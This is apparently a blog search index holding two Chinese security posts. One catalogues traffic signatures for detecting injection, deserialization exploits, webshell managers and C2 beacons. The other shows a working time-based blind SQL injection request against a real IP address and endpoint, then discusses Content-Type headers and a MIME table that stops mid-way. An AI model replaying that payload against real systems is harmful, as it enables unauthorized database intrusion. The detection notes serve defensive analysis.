<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>流量特征</title>
      <link href="/2025/05/27/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/"/>
      <url>/2025/05/27/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>1.参数长度异常：攻击者通常会在SQL注入攻击中使用长参数来尝试构建恶意语句，因此在网络流量中需要寻找异常长度的参数。<br>2.非法字符：攻击者通常使用非法字符来构建恶意SQL语句，如单引号、分号等。<br>3.异常请求：攻击者可能会在HTTP请求中包含多个语句或查询，或者在HTTP请求中包含错误或缺失的参数。<br>4.错误响应：如果应用程序未正确处理SQL注入攻击，则可能会返回错误响应。攻击者可以通过分析响应以查找此类错误，并尝试进一步攻击。<br>5.非常规流量：攻击者可能会在较短时间内发送大量请求，或在同一时间窗口内多次发送相同请求。这种非常规流量模式可能表明攻击正在进行中。</p><p>出现一些特殊字符：比如单引号括号’(<br>出现SQL命令或语句：增加、删除、修改、查询<br>出现注释符号：比如连续两个减号–<br>url上出现万能密码字段：’or’1’&#x3D;’1</p><p>通过http数据流中的sql payload来定位sql注入，观察返回包中的内容（是否返回了如数据库名之类的敏感信息、状态码）</p><p>看请求参数、请求头、请求体中是否包含SQL语句或关键字（比如union select）</p><p>sqlmap流量特征：</p><p>若攻击者使用sqlmap且未加 –random-agent参数，则可以通过捕获请求包的user-agent字段来判断攻击者是否在使用sqlmap进行攻击；sqlmap在进行初识监测时会进行一些预检测，第一条语句是对数据库类型和XSS漏洞进行监测，且这句话几乎每次注入都不变，即我们可以通过XSS测试语句判断。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>payload包含<code>&lt;script&gt;&lt;/script&gt;</code>标签；<br>标签的一些事件：比如onclick、ondbclick、onload；<br>标签的超链接属性：比如href、src。</p><p>和sql注入一样，通过http数据流中的一些关键字来判断是否存在xss</p><p>看请求参数或请求体中是否包含JavaScript代码，将响应体的数据复制到文件中执行，如果弹窗，说明攻击成功。</p><p>http数据流对应返回结果</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307202457337.png" alt="image-20250307202457337"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>找请求包中的命令执行触发语句</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307203256397.png" alt="image-20250307203256397"></p><p>观察数据包中是否存在命令执行的对应结果，如果存在对应返回结果，证明攻击成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307203404259.png" alt="image-20250307203404259"></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>找到上传的请求包，看上传文件名，后缀，Data部分右键显示分组字节，查看文件内容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307202722716.png" alt="image-20250307202722716"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307202730095.png" alt="image-20250307202730095"></p><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>短时间出现大量请求且存在大量404中夹杂一些铭感配置目录信息，判断为目录扫描</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307202856129.png" alt="image-20250307202856129"></p><h1 id="口令爆破"><a href="#口令爆破" class="headerlink" title="口令爆破"></a>口令爆破</h1><p>存在大量口令尝试访问登录页面的数据流，观察返回数据包看是否存在登录成功数据，判断是否攻击成功</p><p>登录成功和登录失败的返回长度不同</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307203147117.png" alt="image-20250307203147117"></p><h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><p>请求中存在jndi字样，且会发起jrmi的二次请求和ldap流量请求</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307203533379.png" alt="image-20250307203533379"></p><p>rmi请求流量源地址为服务器地址目标地址为攻击机器地址<br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307203641329.png" alt="image-20250307203641329"></p><p>并会请求恶意class文件，通过追踪流可以看到请求的class文件内容<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307203731139.png" alt="image-20250307203731139"></p><p>比如说我们通过base64解码之后可以看到命令内容，如果是反弹shell，我们继续看后续流量如果走向该端口，证明攻击成功</p><h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>存在利用链特征@type</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307215812145.png" alt="image-20250307215812145"></p><p>请求恶意文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307215843218.png" alt="image-20250307215843218"></p><p>追踪http流查看恶意文件内容</p><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><p><strong>工具探测shiro框架流量</strong></p><p>请求中携带rememberMe&#x3D;yes进行探测是否存在shiro框架，如果存在返回包中会存在rememberMe&#x3D;deleteMe</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220056188.png" alt="image-20250307220056188"><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220106002.png" alt="image-20250307220106002"></p><p><strong>爆破密钥流量</strong></p><p>密钥爆破失败存在rememberMe&#x3D;deleteMe返回<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220243193.png" alt="image-20250307220243193"></p><p>爆破成功则无返回<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220307989.png" alt="image-20250307220307989"></p><p><strong>爆破利用链流量</strong></p><p>cookie中存在大量字符串</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220348790.png" alt="image-20250307220348790"></p><p><strong>命令执行流量</strong></p><p>返回包中存在多个$标识</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220445039.png" alt="image-20250307220445039"></p><p><strong>内存马特征</strong></p><p>存在密码特征及其路径以及返回成功字眼</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220517146.png" alt="image-20250307220517146"></p><h1 id="strtus2"><a href="#strtus2" class="headerlink" title="strtus2"></a>strtus2</h1><p><strong>工具检测流量特征</strong></p><p>cookie以及请求数据包存在poc包含大量%信息等</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220702605.png" alt="image-20250307220702605"><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220722604.png" alt="image-20250307220722604"></p><p>漏洞存在则会执行代码中包含的内容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220739707.png" alt="image-20250307220739707"></p><p>可能有全局Cookie值（不明显，弱特征，可以更改）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1716212387022-23890120-4847-4ded-b9c9-890cb856f107.png"></p><p>Content-Type中有%{}的字样（{}里是请求的格式&#x2F;类型），后面有传入命令的内容 （强特征！）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1716212652626-6ce1d238-cf17-4c50-a450-3c37beaad164.png"></p><p><strong>命令执行流量特征</strong></p><p>poc还是包含大量的特殊符号（#），以及%{}特征</p><p>追踪tcp数据包可以看到返回结果</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1716213038385-f4fb5dd5-05a2-4711-aa9c-ee5c1f275953.png"></p><p><strong>总结</strong></p><p>包含大量的特殊符号：%、#、{}、（）</p><h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>因为weblogic漏洞大多数通过t3协议利用，所以观察tcp数据包内容可发现攻击者扫描数据</p><p>存在t3字样并且存在执行命令的关键字</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220900669.png" alt="image-20250307220900669"></p><p><strong>写入webshell</strong></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307220957367.png" alt="image-20250307220957367"></p><p><strong>植入内存马</strong></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307221033209.png" alt="image-20250307221033209"></p><h1 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h1><h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h2><p>明文传输</p><p>1、使用URL编解码；<br>2、每个数据包前面都会包含@ini_set(“display_errors”, “0”);@set_time_limit(0);这两个语句；<br>3、响应包都是明文。</p><blockquote><p>我们使用一句话木马上传webshell，抓包后会发现每个请求体都存在以@ini_set(“display_errors”,”0”);@set_time_limit(0)开头。并且响应体的返回结果是base64编码发混淆字符，格式为：随机数 结果 随机数。</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1e2dbc06e080cc2d80fa51995a056884.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307221654337.png" alt="image-20250307221654337"></p><h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><blockquote><p>冰蝎2.0 、 3.0、4.0 版本有差异</p></blockquote><p>冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;</span><br><span class="line">2.&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span><br><span class="line">3.&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;</span><br><span class="line">4.&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55&quot;</span><br><span class="line">5.&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;</span><br><span class="line">6.&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&quot;</span><br><span class="line">7.&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;</span><br><span class="line">8.&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;</span><br><span class="line">9.&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;</span><br><span class="line">10.&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span><br></pre></td></tr></table></figure><p>请求体头部字节与响应题头部字节不会变化</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307222709758.png" alt="image-20250307222709758"></p><p>referer中的文件名都是随机生成的，但文件名是纯大写或者是纯小写（弱特征）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307222744978.png" alt="image-20250307222744978"></p><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>哥斯拉客户端与 shell 建连初期的三个固定行为特征，且顺序出现在同一个 TCP 连接中。可以总结为：<br>特征：发送一段固定代码（payload），http 响应为空<br>特征：发送一段固定代码（test），执行结果为固定内容<br>特征：发送一段固定代码（getBacisInfo）</p><blockquote><p>哥斯拉的流量解密没有密钥是无法做到的</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307223114551.png" alt="image-20250307223114551"></p><p>还有一些奇怪的特征<br>cookie 结尾有 ；<br>响应体前16位和后16为会组成一个32位md5 正则匹配类似于(?i:[0-9A-F]{16})[\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})</p><h1 id="远控服务器"><a href="#远控服务器" class="headerlink" title="远控服务器"></a>远控服务器</h1><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><p>meterpreter命令执行的过程已经进行了加密处理，继续进行活动，防御者也不会发现有价值的数据，但可以观察到每个数据都包含MZ标头和DOS模式异常。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307223229816.png" alt="image-20250307223229816"></p><h2 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h2><p><strong>checksum8</strong></p><p>下载stage payload的过程uri符合 checksum8 规则，即：路径的 ascii 之和与 256 取余计算值等于 92</p><p><strong>sleep</strong></p><p>c2服务器如果没有任务下发，会有规律的请求响应间隔，比如这里是3s<br>c2服务器如果有任务下发，则放入 http 心跳请求返回包中<br>靶机完成任务后，通过 post 方法回传数据</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250307223448117.png" alt="image-20250307223448117"></p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>src中遇到的http请求头问题</title>
      <link href="/2025/05/27/src%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%97%AE%E9%A2%98/"/>
      <url>/2025/05/27/src%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p>在打nday时，遇到了一个时间盲注，我在通过正常请求时发现无法进行时间盲注，于是将网上的poc信息复制粘贴下来，只替换里面的host请求头，发现是存在时间盲注的</p><p>失败poc：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cpasm4/cpasList/getCurserIfAllowLogin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>139.159.251.219:8280</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>70</span><br><span class="line"></span><br><span class="line"><span class="language-ada">ygbh=q&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">1635</span> FROM (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))mlQT) <span class="keyword">AND</span> <span class="symbol">&#x27;qoYJ</span><span class="string">&#x27;=&#x27;</span>qoYJ</span></span><br></pre></td></tr></table></figure><p>成功poc：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cpasm4/cpasList/getCurserIfAllowLogin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>139.159.251.219:8280</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>70</span><br><span class="line"></span><br><span class="line"><span class="language-ada">ygbh=q&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">1635</span> FROM (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))mlQT) <span class="keyword">AND</span> <span class="symbol">&#x27;qoYJ</span><span class="string">&#x27;=&#x27;</span>qoYJ</span></span><br></pre></td></tr></table></figure><p>发现当我把成功的poc中的Content-Type请求头删除时，无法延时</p><p>而当我将poc中的内容删除到只剩下Host请求头和Content-Type请求头时，仍然可以注入</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cpasm4/cpasList/getCurserIfAllowLogin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>139.159.251.219:8280</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-ada">ygbh=q&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">1635</span> FROM (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))mlQT) <span class="keyword">AND</span> <span class="symbol">&#x27;qoYJ</span><span class="string">&#x27;=&#x27;</span>qoYJ</span></span><br></pre></td></tr></table></figure><p>引发了我对Content-Type请求头的思考</p><h1 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h1><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p><p>语法格式：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=something</span><br></pre></td></tr></table></figure><h2 id="HTTP-content-type-对照表"><a href="#HTTP-content-type-对照表" class="headerlink" title="HTTP content-type 对照表"></a>HTTP content-type 对照表</h2><table><thead><tr><th align="left">文件扩展名</th><th align="left">Content-Type(Mime-Type)</th><th align="left">文件扩展名</th><th align="left">Content-Type(Mime-Type)</th></tr></thead><tbody><tr><td align="left">.*（ 二进制流，不知道下载文件类型）</td><td align="left">application&#x2F;octet-stream</td><td align="left">.tif</td><td align="left">image&#x2F;tiff</td></tr><tr><td align="left">.001</td><td align="left">application&#x2F;x-001</td><td align="left">.301</td><td align="left">application&#x2F;x-301</td></tr><tr><td align="left">.323</td><td align="left">text&#x2F;h323</td><td align="left">.906</td><td align="left">application&#x2F;x-906</td></tr><tr><td align="left">.907</td><td align="left">drawing&#x2F;907</td><td align="left">.a11</td><td align="left">application&#x2F;x-a11</td></tr><tr><td align="left">.acp</td><td align="left">audio&#x2F;x-mei-aac</td><td align="left">.ai</td><td align="left">application&#x2F;postscript</td></tr><tr><td align="left">.aif</td><td align="left">audio&#x2F;aiff</td><td align="left">.aifc</td><td align="left">audio&#x2F;aiff</td></tr><tr><td align="left">.aiff</td><td align="left">audio&#x2F;aiff</td><td align="left">.anv</td><td align="left">application&#x2F;x-anv</td></tr><tr><td align="left">.asa</td><td align="left">text&#x2F;asa</td><td align="left">.asf</td><td align="left">video&#x2F;x-ms-asf</td></tr><tr><td align="left">.asp</td><td align="left">text&#x2F;asp</td><td align="left">.asx</td><td align="left">video&#x2F;x-ms-asf</td></tr><tr><td align="left">.au</td><td align="left">audio&#x2F;basic</td><td align="left">.avi</td><td align="left">video&#x2F;avi</td></tr><tr><td align="left">.awf</td><td align="left">application&#x2F;vnd.adobe.workflow</td><td align="left">.biz</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.bmp</td><td align="left">application&#x2F;x-bmp</td><td align="left">.bot</td><td align="left">application&#x2F;x-bot</td></tr><tr><td align="left">.c4t</td><td align="left">application&#x2F;x-c4t</td><td align="left">.c90</td><td align="left">application&#x2F;x-c90</td></tr><tr><td align="left">.cal</td><td align="left">application&#x2F;x-cals</td><td align="left">.cat</td><td align="left">application&#x2F;vnd.ms-pki.seccat</td></tr><tr><td align="left">.cdf</td><td align="left">application&#x2F;x-netcdf</td><td align="left">.cdr</td><td align="left">application&#x2F;x-cdr</td></tr><tr><td align="left">.cel</td><td align="left">application&#x2F;x-cel</td><td align="left">.cer</td><td align="left">application&#x2F;x-x509-ca-cert</td></tr><tr><td align="left">.cg4</td><td align="left">application&#x2F;x-g4</td><td align="left">.cgm</td><td align="left">application&#x2F;x-cgm</td></tr><tr><td align="left">.cit</td><td align="left">application&#x2F;x-cit</td><td align="left">.class</td><td align="left">java&#x2F;*</td></tr><tr><td align="left">.cml</td><td align="left">text&#x2F;xml</td><td align="left">.cmp</td><td align="left">application&#x2F;x-cmp</td></tr><tr><td align="left">.cmx</td><td align="left">application&#x2F;x-cmx</td><td align="left">.cot</td><td align="left">application&#x2F;x-cot</td></tr><tr><td align="left">.crl</td><td align="left">application&#x2F;pkix-crl</td><td align="left">.crt</td><td align="left">application&#x2F;x-x509-ca-cert</td></tr><tr><td align="left">.csi</td><td align="left">application&#x2F;x-csi</td><td align="left">.css</td><td align="left">text&#x2F;css</td></tr><tr><td align="left">.cut</td><td align="left">application&#x2F;x-cut</td><td align="left">.dbf</td><td align="left">application&#x2F;x-dbf</td></tr><tr><td align="left">.dbm</td><td align="left">application&#x2F;x-dbm</td><td align="left">.dbx</td><td align="left">application&#x2F;x-dbx</td></tr><tr><td align="left">.dcd</td><td align="left">text&#x2F;xml</td><td align="left">.dcx</td><td align="left">application&#x2F;x-dcx</td></tr><tr><td align="left">.der</td><td align="left">application&#x2F;x-x509-ca-cert</td><td align="left">.dgn</td><td align="left">application&#x2F;x-dgn</td></tr><tr><td align="left">.dib</td><td align="left">application&#x2F;x-dib</td><td align="left">.dll</td><td align="left">application&#x2F;x-msdownload</td></tr><tr><td align="left">.doc</td><td align="left">application&#x2F;msword</td><td align="left">.dot</td><td align="left">application&#x2F;msword</td></tr><tr><td align="left">.drw</td><td align="left">application&#x2F;x-drw</td><td align="left">.dtd</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.dwf</td><td align="left">Model&#x2F;vnd.dwf</td><td align="left">.dwf</td><td align="left">application&#x2F;x-dwf</td></tr><tr><td align="left">.dwg</td><td align="left">application&#x2F;x-dwg</td><td align="left">.dxb</td><td align="left">application&#x2F;x-dxb</td></tr><tr><td align="left">.dxf</td><td align="left">application&#x2F;x-dxf</td><td align="left">.edn</td><td align="left">application&#x2F;vnd.adobe.edn</td></tr><tr><td align="left">.emf</td><td align="left">application&#x2F;x-emf</td><td align="left">.eml</td><td align="left">message&#x2F;rfc822</td></tr><tr><td align="left">.ent</td><td align="left">text&#x2F;xml</td><td align="left">.epi</td><td align="left">application&#x2F;x-epi</td></tr><tr><td align="left">.eps</td><td align="left">application&#x2F;x-ps</td><td align="left">.eps</td><td align="left">application&#x2F;postscript</td></tr><tr><td align="left">.etd</td><td align="left">application&#x2F;x-ebx</td><td align="left">.exe</td><td align="left">application&#x2F;x-msdownload</td></tr><tr><td align="left">.fax</td><td align="left">image&#x2F;fax</td><td align="left">.fdf</td><td align="left">application&#x2F;vnd.fdf</td></tr><tr><td align="left">.fif</td><td align="left">application&#x2F;fractals</td><td align="left">.fo</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.frm</td><td align="left">application&#x2F;x-frm</td><td align="left">.g4</td><td align="left">application&#x2F;x-g4</td></tr><tr><td align="left">.gbr</td><td align="left">application&#x2F;x-gbr</td><td align="left">.</td><td align="left">application&#x2F;x-</td></tr><tr><td align="left">.gif</td><td align="left">image&#x2F;gif</td><td align="left">.gl2</td><td align="left">application&#x2F;x-gl2</td></tr><tr><td align="left">.gp4</td><td align="left">application&#x2F;x-gp4</td><td align="left">.hgl</td><td align="left">application&#x2F;x-hgl</td></tr><tr><td align="left">.hmr</td><td align="left">application&#x2F;x-hmr</td><td align="left">.hpg</td><td align="left">application&#x2F;x-hpgl</td></tr><tr><td align="left">.hpl</td><td align="left">application&#x2F;x-hpl</td><td align="left">.hqx</td><td align="left">application&#x2F;mac-binhex40</td></tr><tr><td align="left">.hrf</td><td align="left">application&#x2F;x-hrf</td><td align="left">.hta</td><td align="left">application&#x2F;hta</td></tr><tr><td align="left">.htc</td><td align="left">text&#x2F;x-component</td><td align="left">.htm</td><td align="left">text&#x2F;html</td></tr><tr><td align="left">.html</td><td align="left">text&#x2F;html</td><td align="left">.htt</td><td align="left">text&#x2F;webviewhtml</td></tr><tr><td align="left">.htx</td><td align="left">text&#x2F;html</td><td align="left">.icb</td><td align="left">application&#x2F;x-icb</td></tr><tr><td align="left">.ico</td><td align="left">image&#x2F;x-icon</td><td align="left">.ico</td><td align="left">application&#x2F;x-ico</td></tr><tr><td align="left">.iff</td><td align="left">application&#x2F;x-iff</td><td align="left">.ig4</td><td align="left">application&#x2F;x-g4</td></tr><tr><td align="left">.igs</td><td align="left">application&#x2F;x-igs</td><td align="left">.iii</td><td align="left">application&#x2F;x-iphone</td></tr><tr><td align="left">.img</td><td align="left">application&#x2F;x-img</td><td align="left">.ins</td><td align="left">application&#x2F;x-internet-signup</td></tr><tr><td align="left">.isp</td><td align="left">application&#x2F;x-internet-signup</td><td align="left">.IVF</td><td align="left">video&#x2F;x-ivf</td></tr><tr><td align="left">.java</td><td align="left">java&#x2F;*</td><td align="left">.jfif</td><td align="left">image&#x2F;jpeg</td></tr><tr><td align="left">.jpe</td><td align="left">image&#x2F;jpeg</td><td align="left">.jpe</td><td align="left">application&#x2F;x-jpe</td></tr><tr><td align="left">.jpeg</td><td align="left">image&#x2F;jpeg</td><td align="left">.jpg</td><td align="left">image&#x2F;jpeg</td></tr><tr><td align="left">.jpg</td><td align="left">application&#x2F;x-jpg</td><td align="left">.js</td><td align="left">application&#x2F;x-javascript</td></tr><tr><td align="left">.jsp</td><td align="left">text&#x2F;html</td><td align="left">.la1</td><td align="left">audio&#x2F;x-liquid-file</td></tr><tr><td align="left">.lar</td><td align="left">application&#x2F;x-laplayer-reg</td><td align="left">.latex</td><td align="left">application&#x2F;x-latex</td></tr><tr><td align="left">.lavs</td><td align="left">audio&#x2F;x-liquid-secure</td><td align="left">.lbm</td><td align="left">application&#x2F;x-lbm</td></tr><tr><td align="left">.lmsff</td><td align="left">audio&#x2F;x-la-lms</td><td align="left">.ls</td><td align="left">application&#x2F;x-javascript</td></tr><tr><td align="left">.ltr</td><td align="left">application&#x2F;x-ltr</td><td align="left">.m1v</td><td align="left">video&#x2F;x-mpeg</td></tr><tr><td align="left">.m2v</td><td align="left">video&#x2F;x-mpeg</td><td align="left">.m3u</td><td align="left">audio&#x2F;mpegurl</td></tr><tr><td align="left">.m4e</td><td align="left">video&#x2F;mpeg4</td><td align="left">.mac</td><td align="left">application&#x2F;x-mac</td></tr><tr><td align="left">.man</td><td align="left">application&#x2F;x-troff-man</td><td align="left">.math</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.mdb</td><td align="left">application&#x2F;msaccess</td><td align="left">.mdb</td><td align="left">application&#x2F;x-mdb</td></tr><tr><td align="left">.mfp</td><td align="left">application&#x2F;x-shockwave-flash</td><td align="left">.mht</td><td align="left">message&#x2F;rfc822</td></tr><tr><td align="left">.mhtml</td><td align="left">message&#x2F;rfc822</td><td align="left">.mi</td><td align="left">application&#x2F;x-mi</td></tr><tr><td align="left">.mid</td><td align="left">audio&#x2F;mid</td><td align="left">.midi</td><td align="left">audio&#x2F;mid</td></tr><tr><td align="left">.mil</td><td align="left">application&#x2F;x-mil</td><td align="left">.mml</td><td align="left">text&#x2F;xml</td></tr><tr><td align="left">.mnd</td><td align="left">audio&#x2F;x-musicnet-download</td><td align="left">.mns</td><td align="left">audio&#x2F;x-musicnet-stream</td></tr><tr><td align="left">.mocha</td><td align="left">application&#x2F;x-javascript</td><td align="left">.movie</td><td align="left">video&#x2F;x-sgi-movie</td></tr><tr><td align="left">.mp1</td><td align="left">audio&#x2F;mp1</td><td align="left">.mp2</td><td align="left">audio&#x2F;mp2</td></tr><tr><td align="left">.mp2v</td><td align="left">video&#x2F;mpeg</td><td align="left">.mp3</td><td align="left">audio&#x2F;mp3</td></tr><tr><td align="left">.mp4</td><td align="left">video&#x2F;mpeg4</td><td align="left">.mpa</td><td align="left">video&#x2F;x-mpg</td></tr><tr><td align="left">.mpd</td><td align="left">application&#x2F;vnd.ms-project</td><td 